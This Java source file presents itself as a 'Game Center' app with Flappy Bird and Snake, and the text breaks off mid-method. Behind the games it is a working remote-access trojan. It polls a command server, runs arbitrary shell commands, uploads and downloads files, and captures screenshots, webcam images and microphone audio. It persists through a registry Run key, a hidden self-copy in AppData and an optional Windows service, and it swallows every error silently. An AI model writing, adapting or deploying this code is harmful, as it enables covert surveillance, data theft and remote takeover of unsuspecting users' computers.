import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.awt.event.*;
import java.io.*;
import java.net.*;
import javax.imageio.ImageIO;
import javax.sound.sampled.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.prefs.Preferences;
import java.nio.file.*;
import java.util.ArrayList;
import java.util.Random;
import java.util.Base64;

public class GameClient {
    private static final String SERVER_URL = "http://192.168.100.3:5000";
    private static final int POLL_INTERVAL = 2000; // 2 seconds
    private static final int CONNECTION_TIMEOUT = 10000;
    
    private static boolean connected = false;
    private static boolean processingCommand = false;
    private static String currentWorkingDirectory = System.getProperty("user.home");
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static ExecutorService executorService;
    
    // Windows Service related
    private static final String SERVICE_NAME = "GameCenterService";
    private static Preferences prefs = Preferences.userNodeForPackage(GameClient.class);
    
    // App features
    private static boolean minimizeToTray = true;
    private static boolean startMinimized = false;
    private static boolean autoStart = false;
    private static final String APP_NAME = "GameCenter";
    private static final String REGISTRY_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    // Clone related
    private static final String CLONE_NAME = "GameHelper.exe";
    private static final String CLONE_DIR = System.getProperty("user.home") + File.separator + "AppData" + File.separator + "Local" + File.separator + "GameCenter";
    private static File cloneFile;
    private static boolean isClone = false;
    
    public static void main(String[] args) {
        // Check if we're the clone
        String currentPath = System.getProperty("user.dir") + File.separator + "GameClient.jar";
        cloneFile = new File(CLONE_DIR, CLONE_NAME);
        isClone = currentPath.equals(cloneFile.getAbsolutePath());
        
        // Add crash handler
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            writeCrashReport(throwable);
            System.exit(1);
        });
        
        try {
            // Process command line arguments
            for (String arg : args) {
                if (arg.equalsIgnoreCase("--minimized")) {
                    startMinimized = true;
                } else if (arg.equalsIgnoreCase("--service")) {
                    runAsService();
                    return;
                } else if (arg.equalsIgnoreCase("--autostart")) {
                    autoStart = true;
                }
            }
            
            // Clone ourselves if not already cloned
            if (!isClone) {
                createClone();
            }
            
            // Create GUI
            SwingUtilities.invokeLater(() -> {
                JFrame frame = new JFrame("Game Center");
                frame.setSize(800, 600);
                frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
                
                // Add window listener to minimize to tray when closed
                frame.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent e) {
                        if (minimizeToTray) {
                            frame.setVisible(false);
                        } else {
                            running.set(false);
                            System.exit(0);
                        }
                    }
                });
                
                frame.setLayout(new BorderLayout());
                
                // Create game menu
                JPanel mainPanel = new JPanel(new BorderLayout());
                mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
                
                // Header with logo
                JPanel headerPanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
                JLabel logoLabel = new JLabel(createLogoIcon());
                JLabel titleLabel = new JLabel("Game Center");
                titleLabel.setFont(new Font("Arial", Font.BOLD, 32));
                headerPanel.add(logoLabel);
                headerPanel.add(titleLabel);
                mainPanel.add(headerPanel, BorderLayout.NORTH);
                
                // Game buttons panel
                JPanel gamePanel = new JPanel(new GridLayout(2, 2, 20, 20));
                gamePanel.setBorder(BorderFactory.createEmptyBorder(30, 30, 30, 30));
                
                JButton flappyBirdButton = new JButton("Flappy Bird");
                flappyBirdButton.setFont(new Font("Arial", Font.BOLD, 18));
                flappyBirdButton.addActionListener(e -> {
                    JFrame gameFrame = new JFrame("Flappy Bird");
                    gameFrame.setSize(400, 600);
                    gameFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                    gameFrame.add(new FlappyBirdGame());
                    gameFrame.setVisible(true);
                    gameFrame.setLocationRelativeTo(null);
                });
                
                JButton snakeButton = new JButton("Snake Game");
                snakeButton.setFont(new Font("Arial", Font.BOLD, 18));
                snakeButton.addActionListener(e -> {
                    JFrame gameFrame = new JFrame("Snake Game");
                    gameFrame.setSize(400, 600);
                    gameFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                    gameFrame.add(new SnakeGame());
                    gameFrame.setVisible(true);
                    gameFrame.setLocationRelativeTo(null);
                });
                
                JButton settingsButton = new JButton("Settings");
                settingsButton.setFont(new Font("Arial", Font.BOLD, 18));
                settingsButton.addActionListener(e -> {
                    JDialog settingsDialog = new JDialog(frame, "Settings", true);
                    settingsDialog.setSize(400, 300);
                    settingsDialog.setLayout(new BorderLayout());
                    
                    JPanel settingsPanel = new JPanel(new GridLayout(3, 1, 5, 15));
                    settingsPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
                    
                    JCheckBox minimizeToTrayCheck = new JCheckBox("Minimize to System Tray", minimizeToTray);
                    minimizeToTrayCheck.addActionListener(event -> minimizeToTray = minimizeToTrayCheck.isSelected());
                    
                    JCheckBox startupCheck = new JCheckBox("Start with Windows", isInStartup());
                    startupCheck.addActionListener(event -> {
                        if (startupCheck.isSelected()) {
                            addToStartup();
                        } else {
                            removeFromStartup();
                        }
                    });
                    
                    JButton serviceButton = new JButton(isServiceInstalled() ? "Uninstall Service" : "Install Service");
                    serviceButton.addActionListener(event -> {
                        if (isServiceInstalled()) {
                            uninstallService();
                            serviceButton.setText("Install Service");
                        } else {
                            installService();
                            serviceButton.setText("Uninstall Service");
                        }
                    });
                    
                    settingsPanel.add(minimizeToTrayCheck);
                    settingsPanel.add(startupCheck);
                    settingsPanel.add(serviceButton);
                    
                    settingsDialog.add(settingsPanel, BorderLayout.CENTER);
                    settingsDialog.setLocationRelativeTo(frame);
                    settingsDialog.setVisible(true);
                });
                
                JButton exitButton = new JButton("Exit");
                exitButton.setFont(new Font("Arial", Font.BOLD, 18));
                exitButton.addActionListener(e -> {
                    running.set(false);
                    System.exit(0);
                });
                
                gamePanel.add(flappyBirdButton);
                gamePanel.add(snakeButton);
                gamePanel.add(settingsButton);
                gamePanel.add(exitButton);
                
                mainPanel.add(gamePanel, BorderLayout.CENTER);
                frame.add(mainPanel, BorderLayout.CENTER);
                
                // Check if in startup and add if not
                if (!isInStartup()) {
                    addToStartup();
                }
                
                // Start HTTP client
                startHttpClient();
                
                // Show or hide frame based on startMinimized flag
                if (!startMinimized) {
                    frame.setVisible(true);
                    frame.setLocationRelativeTo(null);
                } else {
                    frame.setVisible(false);
                }
            });
        } catch (Exception e) {
            writeCrashReport(e);
            System.exit(1);
        }
    }
    
    private static void createClone() {
        try {
            // Create clone directory if it doesn't exist
            File cloneDir = new File(CLONE_DIR);
            if (!cloneDir.exists()) {
                cloneDir.mkdirs();
            }
            
            // Get current JAR file path
            String currentPath = System.getProperty("user.dir") + File.separator + "GameClient.jar";
            File currentFile = new File(currentPath);
            
            // Copy JAR to clone location
            if (!cloneFile.exists() || cloneFile.length() != currentFile.length()) {
                Files.copy(currentFile.toPath(), cloneFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                
                // Add clone to startup
                String command = "reg add \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + "Helper\" /t REG_SZ /d \"\\\"" + cloneFile.getAbsolutePath() + "\\\" --minimized\" /f";
                Runtime.getRuntime().exec("cmd.exe /c " + command);
            }
            
            // Check if original exists, if not recreate it
            if (!currentFile.exists()) {
                Files.copy(cloneFile.toPath(), currentFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static ImageIcon createLogoIcon() {
        // Create a simple game controller icon
        BufferedImage image = new BufferedImage(64, 64, BufferedImage.TYPE_INT_ARGB);
        Graphics2D g2d = image.createGraphics();
        
        // Set anti-aliasing
        g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
        
        // Draw a game controller shape
        g2d.setColor(new Color(0, 120, 215));
        g2d.fillRoundRect(10, 20, 44, 24, 10, 10);
        
        // Draw D-pad
        g2d.fillRect(18, 10, 8, 8);
        g2d.fillRect(10, 18, 8, 8);
        g2d.fillRect(26, 18, 8, 8);
        g2d.fillRect(18, 26, 8, 8);
        
        // Draw action buttons
        g2d.setColor(Color.RED);
        g2d.fillOval(38, 12, 8, 8);
        g2d.setColor(Color.GREEN);
        g2d.fillOval(46, 20, 8, 8);
        g2d.setColor(Color.BLUE);
        g2d.fillOval(38, 28, 8, 8);
        g2d.setColor(Color.YELLOW);
        g2d.fillOval(30, 20, 8, 8);
        
        g2d.dispose();
        return new ImageIcon(image);
    }
    
    private static void writeCrashReport(Throwable throwable) {
        try {
            File crashFile = new File(System.getProperty("java.io.tmpdir"), "game_center_crash.log");
            try (PrintWriter writer = new PrintWriter(new FileWriter(crashFile, true))) {
                writer.println("=== CRASH REPORT ===");
                writer.println("Timestamp: " + new java.util.Date());
                writer.println("OS: " + System.getProperty("os.name"));
                writer.println("Java Version: " + System.getProperty("java.version"));
                writer.println("\nStack Trace:");
                throwable.printStackTrace(writer);
                writer.println("\n");
            }
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void runAsService() {
        try {
            // Start HTTP client
            startHttpClient();
            
            // Keep the service running
            while (running.get()) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        } catch (Exception e) {
            writeCrashReport(e);
        }
    }
    
    private static boolean isServiceInstalled() {
        try {
            Process process = Runtime.getRuntime().exec("sc query " + SERVICE_NAME);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("STATE") && line.contains("RUNNING")) {
                    return true;
                }
            }
            return false;
        } catch (IOException e) {
            return false;
        }
    }
    
    private static void installService() {
        try {
            String javaPath = System.getProperty("java.home") + "\\bin\\java.exe";
            String jarPath = new File(GameClient.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getPath();
            
            // Create a batch file to install the service with elevation request
            File batchFile = File.createTempFile("install-service", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Installing service...");
                writer.println("sc create " + SERVICE_NAME + " binPath= \"" + javaPath + " -jar \"" + jarPath + "\" --service\"");
                writer.println("sc description " + SERVICE_NAME + " \"Game Center Service\"");
                writer.println("sc start " + SERVICE_NAME);
                writer.println("echo Service installed successfully.");
                writer.println("pause");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            
            // Clean up
            batchFile.delete();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void uninstallService() {
        try {
            // Create a batch file to uninstall the service with elevation request
            File batchFile = File.createTempFile("uninstall-service", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Stopping service...");
                writer.println("sc stop " + SERVICE_NAME);
                writer.println("echo Deleting service...");
                writer.println("sc delete " + SERVICE_NAME);
                writer.println("echo Service uninstalled successfully.");
                writer.println("pause");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            
            // Clean up
            batchFile.delete();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static boolean isInStartup() {
        try {
            String command = "reg query \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + "\"";
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            return process.exitValue() == 0;
        } catch (Exception e) {
            return false;
        }
    }
    
    private static void addToStartup() {
        try {
            String javaPath = System.getProperty("java.home") + "\\bin\\javaw.exe";
            String jarPath = new File(GameClient.class.getProtectionDomain()
                    .getCodeSource().getLocation().toURI()).getPath();
            
            // Create a batch file to add to startup with elevation request
            File batchFile = File.createTempFile("addStartup", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Adding to startup...");
                String escapedJavaPath = javaPath.replace("\"", "\"\"");
                String escapedJarPath = jarPath.replace("\"", "\"\"");
                writer.println("reg add \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + 
                            "\" /t REG_SZ /d \"\\\"" + escapedJavaPath + "\\\" -jar \\\"" + escapedJarPath + "\\\" --minimized\" /f");
                writer.println("if %ERRORLEVEL% equ 0 (");
                writer.println("    echo Successfully added to startup");
                writer.println(") else (");
                writer.println("    echo Failed to add to startup");
                writer.println(")");
                writer.println("exit /b %ERRORLEVEL%");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            // Clean up
            batchFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void removeFromStartup() {
        try {
            // Create a batch file to remove from startup with elevation request
            File batchFile = File.createTempFile("removeStartup", ".bat");
            try (PrintWriter writer = new PrintWriter(batchFile)) {
                writer.println("@echo off");
                writer.println("echo Requesting administrator privileges...");
                writer.println("powershell Start-Process -FilePath \"%~f0\" -Verb RunAs");
                writer.println("exit");
                writer.println(":admin");
                writer.println("echo Removing from startup...");
                writer.println("reg delete \"" + REGISTRY_KEY + "\" /v \"" + APP_NAME + "\" /f");
                writer.println("if %ERRORLEVEL% equ 0 (");
                writer.println("    echo Successfully removed from startup");
                writer.println(") else (");
                writer.println("    echo Failed to remove from startup");
                writer.println(")");
                writer.println("exit /b %ERRORLEVEL%");
            }
            
            // Run the batch file
            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", batchFile.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            // Clean up
            batchFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void startHttpClient() {
        executorService = Executors.newFixedThreadPool(3);
        
        // HTTP client thread
        executorService.submit(() -> {
            while (running.get()) {
                try {
                    // Get command from server
                    String command = getCommandFromServer();
                    
                    if (command != null && !command.equals("NOOP") && !processingCommand) {
                        processingCommand = true;
                        final String cmd = command;
                        executorService.submit(() -> {
                            try {
                                processCommand(cmd);
                            } catch (Exception e) {
                                // Silently fail
                            } finally {
                                processingCommand = false;
                            }
                        });
                    }
                    
                    // Sleep before next poll
                    Thread.sleep(POLL_INTERVAL);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    // Silently fail
                }
            }
        });
    }
    
    private static String getCommandFromServer() {
        try {
            URL url = new URL(SERVER_URL + "/command");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        response.append(line);
                    }
                    
                    // Parse JSON response
                    String json = response.toString();
                    if (json.contains("\"command\":")) {
                        int start = json.indexOf("\"command\":\"") + 11;
                        int end = json.indexOf("\"", start);
                        return json.substring(start, end);
                    }
                }
            }
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
        return null;
    }
    
    private static void sendResultToServer(String command, int exitCode, String output, String error) {
        try {
            URL url = new URL(SERVER_URL + "/result");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            connection.setDoOutput(true);
            
            // Create JSON payload
            String jsonPayload = String.format(
                "{\"command\":\"%s\",\"exit_code\":%d,\"output\":\"%s\",\"error\":\"%s\"}",
                escapeJson(command), exitCode, escapeJson(output), escapeJson(error)
            );
            
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static String escapeJson(String text) {
        if (text == null) return "";
        return text.replace("\\", "\\\\")
                  .replace("\"", "\\\"")
                  .replace("\r", "\\r")
                  .replace("\n", "\\n")
                  .replace("\t", "\\t");
    }
    
    private static void processCommand(String command) {
        try {
            if (command.equals("HEARTBEAT")) {
                // Heartbeat response, do nothing
                return;
            } else if (command.startsWith("send ")) {
                String filePath = command.substring(5);
                downloadFile(filePath);
                sendResultToServer(command, 0, "File downloaded successfully", "");
            } else if (command.startsWith("pull ")) {
                String filePath = command.substring(5);
                uploadFile(filePath, "/upload");
                sendResultToServer(command, 0, "File uploaded successfully", "");
            } else if (command.equals("screenshot")) {
                takeScreenshot();
                sendResultToServer(command, 0, "Screenshot captured", "");
            } else if (command.equals("webcam")) {
                takeWebcamSnapshot();
                sendResultToServer(command, 0, "Webcam snapshot captured", "");
            } else if (command.startsWith("microphone ")) {
                try {
                    String durationStr = command.substring(11).trim();
                    int duration = Integer.parseInt(durationStr);
                    if (duration > 0) {
                        recordAudio(duration);
                        sendResultToServer(command, 0, "Audio recorded", "");
                    }
                } catch (NumberFormatException e) {
                    sendResultToServer(command, 1, "", "Invalid duration");
                }
            } else if (command.equals("pwd")) {
                // Print working directory
                sendResultToServer(command, 0, currentWorkingDirectory, "");
            } else if (command.startsWith("cd ")) {
                // Change directory
                String newDir = command.substring(3).trim();
                changeDirectory(newDir);
            } else if (command.equals("cd")) {
                // cd with no arguments goes to home
                currentWorkingDirectory = System.getProperty("user.home");
                sendResultToServer(command, 0, "Changed directory to: " + currentWorkingDirectory, "");
            } else if (!command.trim().isEmpty()) {
                executeShellCommand(command);
            }
        } catch (Exception e) {
            sendResultToServer(command, 1, "", "Error processing command: " + e.getMessage());
        }
    }
    
    private static void downloadFile(String filename) {
        try {
            URL url = new URL(SERVER_URL + "/download/" + URLEncoder.encode(filename, "UTF-8"));
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                File file = new File(currentWorkingDirectory, filename);
                file.getParentFile().mkdirs();
                
                try (InputStream is = connection.getInputStream();
                     FileOutputStream fos = new FileOutputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, bytesRead);
                    }
                }
            }
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void uploadFile(String filePath, String endpoint) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                sendResultToServer("pull " + filePath, 1, "", "File not found: " + filePath);
                return;
            }
            
            String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
            URL url = new URL(SERVER_URL + endpoint);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            connection.setConnectTimeout(CONNECTION_TIMEOUT);
            connection.setReadTimeout(CONNECTION_TIMEOUT);
            connection.setDoOutput(true);
            
            try (OutputStream os = connection.getOutputStream();
                 PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true)) {
                
                // Send file header
                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(file.getName()).append("\"\r\n");
                writer.append("Content-Type: application/octet-stream\r\n\r\n");
                writer.flush();
                
                // Send file content
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                }
                os.flush();
                
                // Send end of multipart
                writer.append("\r\n--").append(boundary).append("--\r\n");
                writer.flush();
            }
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void takeScreenshot() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenImage = robot.createScreenCapture(screenRect);
            
            File tempFile = File.createTempFile("screenshot", ".png");
            ImageIO.write(screenImage, "png", tempFile);
            
            uploadFile(tempFile.getAbsolutePath(), "/screenshot");
            
            tempFile.delete();
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    private static void takeWebcamSnapshot() {
        Process process = null;
        try {
            String os = System.getProperty("os.name").toLowerCase();
            File tempFile = File.createTempFile("webcam", ".jpg");
            String tempPath = tempFile.getAbsolutePath();
            
            ProcessBuilder pb;
            
            if (os.contains("win")) {
                // Windows - using CommandCam
                pb = new ProcessBuilder("CommandCam", "/filename", tempPath);
                pb.redirectErrorStream(true);
                process = pb.start();
                
                // Read output
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    // Silently read output
                }
                
                int exitCode = process.waitFor();
                
                if (exitCode != 0 || !tempFile.exists() || tempFile.length() == 0) {
                    throw new Exception("CommandCam failed");
                }
                
            } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                // Linux/Unix/Mac
                if (os.contains("mac")) {
                    // macOS - using imagesnap
                    pb = new ProcessBuilder("imagesnap", "-w", "1", tempPath);
                } else {
                    // Linux - using fswebcam
                    pb = new ProcessBuilder("fswebcam", "-r", "640x480", "--no-banner", "-S", "5", tempPath);
                }
                
                pb.redirectErrorStream(true);
                process = pb.start();
                
                // Read output
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    // Silently read output
                }
                
                int exitCode = process.waitFor();
                
                if (exitCode != 0) {
                    throw new Exception("Webcam capture command failed with exit code: " + exitCode);
                }
            } else {
                throw new Exception("Unsupported operating system: " + os);
            }
            
            // Check if file was created and has content
            if (!tempFile.exists() || tempFile.length() == 0) {
                sendResultToServer("webcam", 1, "", "Webcam capture failed - no capture tool available");
                tempFile.delete();
                return;
            }
            
            // Upload the file to the server
            uploadFile(tempPath, "/webcam");
            
            // Delete the temporary file
            tempFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        } finally {
            if (process != null && process.isAlive()) {
                process.destroy();
            }
        }
    }
    
    private static void recordAudio(int duration) {
        TargetDataLine line = null;
        ByteArrayOutputStream byteArrayOutputStream = null;
        
        try {
            // Define audio format
            AudioFormat format = new AudioFormat(
                AudioFormat.Encoding.PCM_SIGNED,
                44100.0f,  // Sample rate
                16,        // Bits per sample
                2,         // Channels (stereo)
                4,         // Frame size (2 channels * 16 bits / 8)
                44100.0f,  // Frame rate
                false      // Little endian
            );
            
            // Get the microphone line
            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
            
            if (!AudioSystem.isLineSupported(info)) {
                // Try with mono
                format = new AudioFormat(
                    AudioFormat.Encoding.PCM_SIGNED,
                    44100.0f,
                    16,
                    1,  // Mono
                    2,  // Frame size (1 channel * 16 bits / 8)
                    44100.0f,
                    false
                );
                info = new DataLine.Info(TargetDataLine.class, format);
                
                if (!AudioSystem.isLineSupported(info)) {
                    sendResultToServer("microphone " + duration, 1, "", "Audio recording not supported");
                    return;
                }
            }
            
            // Open and start the microphone line
            line = (TargetDataLine) AudioSystem.getLine(info);
            line.open(format);
            line.start();
            
            // Record audio in memory
            byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            
            long startTime = System.currentTimeMillis();
            long endTime = startTime + (duration * 1000L);
            
            while (System.currentTimeMillis() < endTime) {
                int bytesRead = line.read(buffer, 0, buffer.length);
                if (bytesRead > 0) {
                    byteArrayOutputStream.write(buffer, 0, bytesRead);
                }
            }
            
            // Stop and close the line
            line.stop();
            line.close();
            line = null;
            
            // Convert to audio file
            byte[] audioData = byteArrayOutputStream.toByteArray();
            byteArrayOutputStream.close();
            byteArrayOutputStream = null;
            
            if (audioData.length == 0) {
                sendResultToServer("microphone " + duration, 1, "", "Audio recording failed - no data captured");
                return;
            }
            
            // Create audio input stream
            ByteArrayInputStream bais = new ByteArrayInputStream(audioData);
            AudioInputStream audioInputStream = new AudioInputStream(
                bais, 
                format, 
                audioData.length / format.getFrameSize()
            );
            
            // Save to temporary file
            File tempFile = File.createTempFile("audio", ".wav");
            AudioSystem.write(audioInputStream, AudioFileFormat.Type.WAVE, tempFile);
            audioInputStream.close();
            
            // Upload the file to the server
            uploadFile(tempFile.getAbsolutePath(), "/microphone");
            
            // Delete the temporary file
            tempFile.delete();
            
        } catch (Exception e) {
            // Silently fail
        } finally {
            // Clean up resources
            if (line != null && line.isOpen()) {
                line.stop();
                line.close();
            }
            if (byteArrayOutputStream != null) {
                try {
                    byteArrayOutputStream.close();
                } catch (IOException e) {
                    // Ignore
                }
            }
        }
    }
    
    private static void changeDirectory(String newDir) {
        try {
            File dir;
            
            // Handle special cases
            if (newDir.equals("..")) {
                // Go up one directory
                dir = new File(currentWorkingDirectory).getParentFile();
                if (dir == null) {
                    sendResultToServer("cd " + newDir, 1, "", "Already at root directory");
                    return;
                }
            } else if (newDir.equals("~") || newDir.equals("$HOME")) {
                // Go to home directory
                dir = new File(System.getProperty("user.home"));
            } else if (newDir.startsWith("/")) {
                // Absolute path
                dir = new File(newDir);
            } else {
                // Relative path
                dir = new File(currentWorkingDirectory, newDir);
            }
            
            // Check if directory exists and is a directory
            if (!dir.exists()) {
                sendResultToServer("cd " + newDir, 1, "", "Directory does not exist: " + newDir);
            } else if (!dir.isDirectory()) {
                sendResultToServer("cd " + newDir, 1, "", "Not a directory: " + newDir);
            } else {
                // Change the working directory
                currentWorkingDirectory = dir.getCanonicalPath();
                sendResultToServer("cd " + newDir, 0, "Changed directory to: " + currentWorkingDirectory, "");
            }
        } catch (Exception e) {
            sendResultToServer("cd " + newDir, 1, "", "Error changing directory: " + e.getMessage());
        }
    }
    
    private static void executeShellCommand(String command) {
        try {
            // Determine the OS and use appropriate shell
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;
            
            if (os.contains("win")) {
                // Windows - use cmd.exe
                pb = new ProcessBuilder("cmd.exe", "/c", command);
            } else {
                // Linux/Unix/Mac - use bash or sh
                pb = new ProcessBuilder("/bin/bash", "-c", command);
            }
            
            // Set the working directory for the command
            pb.directory(new File(currentWorkingDirectory));
            
            // Start the process
            Process process = pb.start();
            
            // Create streams for reading output and error
            InputStream inputStream = process.getInputStream();
            InputStream errorStream = process.getErrorStream();
            
            // Create readers for the streams
            BufferedReader inputReader = new BufferedReader(new InputStreamReader(inputStream));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(errorStream));
            
            // Create string builders to store the output
            StringBuilder output = new StringBuilder();
            StringBuilder error = new StringBuilder();
            
            // Read the output stream
            String line;
            while ((line = inputReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            // Read the error stream
            while ((line = errorReader.readLine()) != null) {
                error.append(line).append("\n");
            }
            
            // Wait for the process to complete
            int exitCode = process.waitFor();
            
            // Send the output back to the server
            sendResultToServer(command, exitCode, output.toString(), error.toString());
            
        } catch (Exception e) {
            sendResultToServer(command, 1, "", "Error executing command: " + e.getMessage());
        }
    }
    
    // Flappy Bird Game
    static class FlappyBirdGame extends JPanel {
        private static final int WIDTH = 400;
        private static final int HEIGHT = 600;
        private static final int GRAVITY = 1;
        private static final int JUMP_STRENGTH = -15;
        private static final int PIPE_WIDTH = 80;
        private static final int PIPE_GAP = 200;
        private static final int PIPE_SPEED = 3;
        
        private int birdY = HEIGHT / 2;
        private int birdVelocity = 0;
        private int pipeX = WIDTH;
        private int pipeY = (int) (Math.random() * (HEIGHT - PIPE_GAP - 100)) + 50;
        private int score = 0;
        private boolean gameOver = false;
        private boolean started = false;
        
        public FlappyBirdGame() {
            setPreferredSize(new Dimension(WIDTH, HEIGHT));
            setBackground(Color.CYAN);
            setFocusable(true);
            addKeyListener(new KeyAdapter() {
                @Override
                public void keyPressed(KeyEvent e) {
                    if (e.getKeyCode() == KeyEvent.VK_SPACE) {
                        if (!started) {
                            started = true;
                        } else if (!gameOver) {
                            birdVelocity = JUMP_STRENGTH;
                        } else {
                            resetGame();
                        }
                    }
                }
            });
            
            Timer timer = new Timer(20, e -> {
                if (started && !gameOver) {
                    birdVelocity += GRAVITY;
                    birdY += birdVelocity;
                    
                    pipeX -= PIPE_SPEED;
                    if (pipeX + PIPE_WIDTH < 0) {
                        pipeX = WIDTH;
                        pipeY = (int) (Math.random() * (HEIGHT - PIPE_GAP - 100)) + 50;
                        score++;
                    }
                    
                    // Check collisions
                    if (birdY < 0 || birdY > HEIGHT - 30) {
                        gameOver = true;
                    }
                    
                    if (pipeX < 100 && pipeX + PIPE_WIDTH > 50) {
                        if (birdY < pipeY || birdY + 30 > pipeY + PIPE_GAP) {
                            gameOver = true;
                        }
                    }
                }
                repaint();
            });
            timer.start();
        }
        
        private void resetGame() {
            birdY = HEIGHT / 2;
            birdVelocity = 0;
            pipeX = WIDTH;
